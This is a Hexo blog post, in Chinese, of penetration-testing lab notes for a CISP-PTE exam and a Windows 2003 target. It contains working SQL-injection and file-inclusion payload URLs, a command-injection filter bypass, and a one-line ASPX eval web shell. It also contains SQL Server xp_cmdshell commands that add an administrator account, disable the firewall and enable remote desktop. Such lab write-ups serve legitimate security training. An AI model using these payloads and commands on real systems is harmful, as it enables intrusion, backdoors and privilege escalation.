@@ -1,0 +1,223 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>欢迎来到我的博客 | 欢迎来到我的博客</title><meta name="author" content="仰泳鱼"><meta name="copyright" content="仰泳鱼"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="var&#x2F;log&#x2F;apache&#x2F;accesserror 360 cisp-pte1、sql注入发现过滤了空格，union，空格用&#x2F;**&#x2F;来代替，union考虑用双写来绕过第一步：闭合id找注入点构造payload http:∥192.168.43.99:8081 vulnerabilities&#x2F;fu1.php?id&#x3D;1%27)*1and*11&#x3D;1%2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="欢迎来到我的博客">
+<meta property="og:url" content="http://example.com/2024/08/05/8.5/index.html">
+<meta property="og:site_name" content="欢迎来到我的博客">
+<meta property="og:description" content="var&#x2F;log&#x2F;apache&#x2F;accesserror 360 cisp-pte1、sql注入发现过滤了空格，union，空格用&#x2F;**&#x2F;来代替，union考虑用双写来绕过第一步：闭合id找注入点构造payload http:∥192.168.43.99:8081 vulnerabilities&#x2F;fu1.php?id&#x3D;1%27)*1and*11&#x3D;1%2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp">
+<meta property="article:published_time" content="2024-08-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-05T11:35:56.604Z">
+<meta property="article:author" content="仰泳鱼">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp"><link rel="shortcut icon" href="https://www.emojiall.com/images/240/emojione/1f1e8-1f1f3.png"><link rel="canonical" href="http://example.com/2024/08/05/8.5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '欢迎来到我的博客',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-05 19:35:56'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/07/11/Dl2NuA1dKsQm3wn.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 作者</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="欢迎来到我的博客"><span class="site-name">欢迎来到我的博客</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 作者</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-04T16:00:00.000Z" title="发表于 2024-08-05 00:00:00">2024-08-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-05T11:35:56.604Z" title="更新于 2024-08-05 19:35:56">2024-08-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%97%A5%E5%BF%97/">日志</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>var&#x2F;log&#x2F;apache&#x2F;access<em>error</em></p>
+<h1 id="360-cisp-pte"><a href="#360-cisp-pte" class="headerlink" title="360 cisp-pte"></a>360 cisp-pte</h1><p>1、sql注入<br>发现过滤了空格，union，空格用&#x2F;**&#x2F;来代替，union考虑用双写来绕过<br>第一步：闭合id找注入点<br><code>构造payload http:∥192.168.43.99:8081 vulnerabilities/fu1.php?id=1%27)*1and*11=1%23</code><br><code>http://192.168.43.99:8081/vulnerabilities/fu1.php?id=1%27)*/and/**/1=2%23</code><br>第二步：判断字段数：<br><code>http://192.168.43.99:8081/vulnerabilities/fu1.php?id=1%27)/**/and/**/1=1/**/group/**/by/**/4%23</code><br>当group by 到5时，发现报错。<br>第三步：找回显点 <br><code>http://192.168.43.99:8081/vulnerabilities/fu1.php?id=1%27)/**/and/**/1=2/**/ununionion/**/select/**/1,2,3,4%23</code><br>第四步：由于题目直接说了通过SQL注入漏洞读取&#x2F;tmp&#x2F;360&#x2F;key文件,答案就在文件中。读文件直接用load_file即可搞定。<br>回显点有好多个，这里直接在3、4处显示文件内容。<br>构造最终的payload</p>
+<p>2、文件上传<br>使用图片木马<br>使用蚂蚁剑连接</p>
+<p>3、文件包含<br>构造payload<br><code>http://192.168.43.99:8083/vulnerabilities/fu1.php?file=php://filter/read=convert.base64-encode/resource=../key.php</code><br>解密即可拿到key<br><strong>还有date协议在这里也可以用：</strong> <br>data:text&#x2F;plain,<?php system(whoami)?><br>构造payload:<br><a target="_blank" rel="noopener" href="http://192.168.43.99:8083/vulnerabilities/fu1.php?file=data:text/plain,%3C?php%20system(%27cat%20../key.php%27)?%3E">http://192.168.43.99:8083/vulnerabilities/fu1.php?file=data:text/plain,%3C?php%20system(%27cat%20../key.php%27)?%3E</a></p>
+<p>4、命令执行<br>输入 127.0.0.1 提交发现有返回<br>题目提到答案在根目录下的key.php中<br>测试 127.0.0.1 &amp;&amp; cat ..&#x2F;key.php 发现cat为敏感函数<br>想办法绕过 cat</p>
+<blockquote>
+<p>在Windows系统中，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%AD%A3%E6%96%9C%E6%9D%A0/863308?fromModule=lemma_inlink" title="正斜杠">正斜杠</a>&#x2F;表示除法，用来进行整除运算；反斜杠\用来表示目录。</p>
+<p>在<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Unix/219943?fromModule=lemma_inlink" title="Unix">Unix</a>系统中，&#x2F;表示目录；\表示跳脱字符将特殊字符变成一般字符（如enter,$,空格等）<br>paylo：127.0.0.1&amp;&amp;c\at ..&#x2F;key.php</p>
+</blockquote>
+<h1 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL Server提权"></a>SQL Server提权</h1><p>RECONFIGURE  <em>刷新环境变量</em><br>EXEC sp_configure ‘show advanced options’,1  <em>启动高级设置</em><br>RECONFIGURE<br>EXEC sp_configure ‘xp_cmdshell’,1  <em>启用xp_cmdshell模块</em><br>exec master..xp_cmdshell ‘net user admin 1qaz@WSX &#x2F;add’  <em>执行命令-添加</em><br>exec master..xp_cmdshell ‘net localgroup administrators admin &#x2F;add’<br>exec master..xp_cmdshell ‘netsh firewall set opmode disable’  <em>关闭防火墙</em><br>exec master..xp_cmdshell ‘REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f’  <em>开启3389</em><br>exec master..xp_cmdshell ‘netstat -anop tcp | find “3389”‘ <em>查看3389是否开启</em></p>
+<h1 id="win2003"><a href="#win2003" class="headerlink" title="win2003"></a>win2003</h1><p>靶机模式改为nat<br>目标：1. 获得3个flag<br>2. administrator密码<br>靶机密码123456<br>在靶机使用cmd获取ip后使用nmap扫描其端口号<br><img src="/../img/Pasted%20image%2020240805183238.png"><br>找到端口后发现需要登录账户密码，使用御剑或者dirsearch扫描目录<br><img src="/../img/Pasted%20image%2020240805163342.png"><br><img src="/../img/Pasted%20image%2020240805163358.png"><br>通过web.config.bak目录获取数据库账户密码，使用navicat连接<img src="/../img/Pasted%20image%2020240805183601.png"><br>找到用户名与密码登录后页面显示key1<br><img src="/../img/Pasted%20image%2020240805183741.png"><br>上传木马文件,这里连接密码为z<br><code>GIF89a</code><br><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%Response.Write(eval(Request.Item[&quot;z&quot;],&quot;unsafe&quot;));%&gt;</code><img src="/../img/Pasted%20image%2020240805183855.png"><br>因为文件名会过长，所以修改文件名长度为刚好显示出后缀aspx<img src="/../img/Pasted%20image%2020240805184058.png"><br>复制一个文件路径，删除几段字母再进入会爆出错误路径，可知正确路径样式\upfile\affix<br><img src="/../img/Pasted%20image%2020240805191946.png">蚂蚁剑连接正确文件路径为<a target="_blank" rel="noopener" href="http://192.168.107.140:27689/upfile/affix/xxxx">http://192.168.107.140:27689/upfile/affix/xxxx</a><br><img src="/../img/Pasted%20image%2020240805184803.png"><br>找到key2在key1key.key位置<br>在最下方web配置文件找到sql server超级管理员的账户密码<img src="/../img/Pasted%20image%2020240805190722.png">使用navicat再次连接，目的是在其中能够执行修改管理员密码的命令<br><img src="/../img/Pasted%20image%2020240805185703.png"><br>执行后如果无法登录，参考window命令net user admin password。单独执行第7行代码的修改，因为用户名只能为administrator<br><img src="/../img/Pasted%20image%2020240805190123.png"><br>主机搜索进入远程桌面连接–&gt;rdp<img src="/../img/Pasted%20image%2020240805190335.png"><br>输入用户名与密码拿到key3<img src="/../img/Pasted%20image%2020240805190421.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">仰泳鱼</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/08/05/8.5/">http://example.com/2024/08/05/8.5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">欢迎来到我的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/08/03/8.3/" title=""><img class="cover" src="https://s2.loli.net/2024/07/11/VqCFHvzbt6WDOMk.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/07/11/Dl2NuA1dKsQm3wn.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">仰泳鱼</div><div class="author-info__description">仅供分享个人研究成果</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/1234567fang"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/1234567fang" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">今日事，今日毕</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#360-cisp-pte"><span class="toc-number">1.</span> <span class="toc-text">360 cisp-pte</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Server%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">SQL Server提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#win2003"><span class="toc-number">3.</span> <span class="toc-text">win2003</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/08/05/8.5/" title="无题"><img src="https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2024/08/05/8.5/" title="无题">无题</a><time datetime="2024-08-04T16:00:00.000Z" title="发表于 2024-08-05 00:00:00">2024-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/03/8.3/" title="无题"><img src="https://s2.loli.net/2024/07/11/VqCFHvzbt6WDOMk.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2024/08/03/8.3/" title="无题">无题</a><time datetime="2024-08-02T16:00:00.000Z" title="发表于 2024-08-03 00:00:00">2024-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/02/8.2/" title="无题"><img src="https://s2.loli.net/2024/07/11/3p72al5i9FCwBKj.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2024/08/02/8.2/" title="无题">无题</a><time datetime="2024-08-01T16:00:00.000Z" title="发表于 2024-08-02 00:00:00">2024-08-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/01/8.1/" title="无题"><img src="https://s2.loli.net/2024/07/11/bKrwGlYSe5hQ8xf.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2024/08/01/8.1/" title="无题">无题</a><time datetime="2024-07-31T16:00:00.000Z" title="发表于 2024-08-01 00:00:00">2024-08-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/31/7.31/" title="无题"><img src="https://s2.loli.net/2024/07/11/VqCFHvzbt6WDOMk.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2024/07/31/7.31/" title="无题">无题</a><time datetime="2024-07-30T16:00:00.000Z" title="发表于 2024-07-31 00:00:00">2024-07-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 仰泳鱼</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid@10.8.0/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addGlobalFn('themeChange', runMermaid, 'mermaid')
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
